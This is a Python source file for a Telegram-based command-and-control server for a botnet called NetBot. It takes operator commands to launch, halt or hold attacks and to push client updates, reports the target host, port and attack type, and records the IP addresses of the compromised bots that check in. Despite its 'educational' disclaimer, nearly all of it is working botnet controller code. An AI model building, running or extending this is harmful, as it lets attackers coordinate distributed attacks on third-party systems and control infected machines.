#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Author	 : Shankar Narayana Damodaran (Modified for Telegram)
# Tool 		 : NetBot v1.0 Telegram Edition
# 
# Description	 : Telegram-based command & control center for NetBot.
#              		Should be used for educational, research purposes and internal use only.
#

import telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext
import threading
from importlib import reload
import telegram_config
from datetime import datetime

print (""" ______             ______             
|  ___ \\       _   (____  \\       _    
| |   | | ____| |_  ____)  ) ___ | |_  
| |   | |/ _  )  _)|  __  ( / _ \\|  _) 
| |   | ( (/ /| |__| |__)  ) |_| | |__ 
|_|   |_|\\____)\\___)______/ \\___/ \\___)1.0 Telegram Edition from https://github.com/skavngr
                                       """)

# Global variables
connected_bots = 0
bot_connections = {}  # Store bot connections: {bot_id: {'last_seen': timestamp, 'ip': str}}

def config():
    import netbot_config
    netbot_config = reload(netbot_config)
    return netbot_config.ATTACK_STATUS

def is_authorized(user_id):
    """Check if user is authorized to use the bot"""
    authorized = telegram_config.AUTHORIZED_USERS
    return str(user_id) in authorized

def start(update: Update, context: CallbackContext):
    """Handle /start command"""
    if not is_authorized(update.effective_user.id):
        update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    welcome_text = """
🤖 *NetBot Telegram CCC* 🤖

Welcome to the NetBot Command & Control Center!

Available Commands:
/start - Show this message
/status - Show bot connection status
/launch - Start attack
/halt - Stop attack immediately
/hold - Hold/wait for commands
/update - Update client code
/config - Show current attack configuration
/bots - List connected bots

Use /help for more details.
"""
    update.message.reply_text(welcome_text, parse_mode='Markdown')

def status(update: Update, context: CallbackContext):
    """Handle /status command"""
    if not is_authorized(update.effective_user.id):
        update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    status_text = f"""
📊 *NetBot Status*

🔗 Connected Bots: {connected_bots}
⏰ Last Update: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🎯 Attack Status: {config().split('_')[2] if config() else 'OFFLINE'}
"""
    update.message.reply_text(status_text, parse_mode='Markdown')

def launch(update: Update, context: CallbackContext):
    """Handle /launch command"""
    if not is_authorized(update.effective_user.id):
        update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    # Update config to LAUNCH
    import netbot_config
    netbot_config.ATTACK_CODE = "LAUNCH"
    
    update.message.reply_text(f"🚀 *Attack Launched!*\n\nTarget: {netbot_config.ATTACK_TARGET_HOST}:{netbot_config.ATTACK_TARGET_PORT}\nType: {netbot_config.ATTACK_TYPE}", parse_mode='Markdown')

def halt(update: Update, context: CallbackContext):
    """Handle /halt command"""
    if not is_authorized(update.effective_user.id):
        update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    # Update config to HALT
    import netbot_config
    netbot_config.ATTACK_CODE = "HALT"
    
    update.message.reply_text("🛑 *Attack Halted!*", parse_mode='Markdown')

def hold(update: Update, context: CallbackContext):
    """Handle /hold command"""
    if not is_authorized(update.effective_user.id):
        update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    # Update config to HOLD
    import netbot_config
    netbot_config.ATTACK_CODE = "HOLD"
    
    update.message.reply_text("⏸️ *Holding...* Waiting for commands.", parse_mode='Markdown')

def update_client(update: Update, context: CallbackContext):
    """Handle /update command"""
    if not is_authorized(update.effective_user.id):
        update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    # Update config to UPDATE
    import netbot_config
    netbot_config.ATTACK_CODE = "UPDATE"
    
    update.message.reply_text("🔄 *Update Command Sent!* Clients will update on next heartbeat.", parse_mode='Markdown')

def show_config(update: Update, context: CallbackContext):
    """Handle /config command"""
    if not is_authorized(update.effective_user.id):
        update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    import netbot_config
    config_text = f"""
⚙️ *Current Configuration*

🎯 Target: {netbot_config.ATTACK_TARGET_HOST}
🔌 Port: {netbot_config.ATTACK_TARGET_PORT}
💥 Attack Type: {netbot_config.ATTACK_TYPE}
⏱️ Burst Delay: {netbot_config.ATTACK_BURST_SECONDS}s
🚦 Status: {netbot_config.ATTACK_CODE}
"""
    update.message.reply_text(config_text, parse_mode='Markdown')

def list_bots(update: Update, context: CallbackContext):
    """Handle /bots command"""
    if not is_authorized(update.effective_user.id):
        update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    if connected_bots == 0:
        update.message.reply_text("📭 No bots currently connected.")
    else:
        bots_text = f"🤖 *Connected Bots ({connected_bots})*\n\n"
        for bot_id, info in bot_connections.items():
            last_seen = info['last_seen'].strftime('%Y-%m-%d %H:%M:%S')
            bots_text += f"🔹 Bot {bot_id}\n   IP: {info['ip']}\n   Last Seen: {last_seen}\n\n"
        update.message.reply_text(bots_text, parse_mode='Markdown')

def register_bot(bot_id, ip_address):
    """Register a bot connection"""
    global connected_bots
    if bot_id not in bot_connections:
        connected_bots += 1
    bot_connections[bot_id] = {'last_seen': datetime.now(), 'ip': ip_address}
    print(f'\x1b[0;30;42m' + ' Bot is now Online! ' + '\x1b[0m', f'Bot ID: {bot_id}, IP: {ip_address}', '\x1b[6;30;43m' + f' Total Bots Connected: {connected_bots}' + '\x1b[0m')

def heartbeat_handler(update: Update, context: CallbackContext):
    """Handle heartbeat messages from bots"""
    message = update.message.text
    if message.startswith("HEARTBEAT"):
        # Extract bot ID and IP from message if available
        parts = message.split()
        bot_id = parts[1] if len(parts) > 1 else "unknown"
        ip_address = parts[2] if len(parts) > 2 else "unknown"
        
        register_bot(bot_id, ip_address)
        
        # Send current attack status
        attack_status = config()
        update.message.reply_text(attack_status)

def main():
    """Start the Telegram bot"""
    # Create the Updater
    updater = Updater(telegram_config.TELEGRAM_BOT_TOKEN, use_context=True)
    dispatcher = updater.dispatcher
    
    # Register command handlers
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("status", status))
    dispatcher.add_handler(CommandHandler("launch", launch))
    dispatcher.add_handler(CommandHandler("halt", halt))
    dispatcher.add_handler(CommandHandler("hold", hold))
    dispatcher.add_handler(CommandHandler("update", update_client))
    dispatcher.add_handler(CommandHandler("config", show_config))
    dispatcher.add_handler(CommandHandler("bots", list_bots))
    
    # Handle heartbeat messages from bots
    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, heartbeat_handler))
    
    # Start the bot
    print("🚀 NetBot Telegram CCC Server Started!")
    print(f"📱 Bot Token: {telegram_config.TELEGRAM_BOT_TOKEN[:10]}...")
    print(f"👤 Authorized Users: {len(telegram_config.AUTHORIZED_USERS)}")
    
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
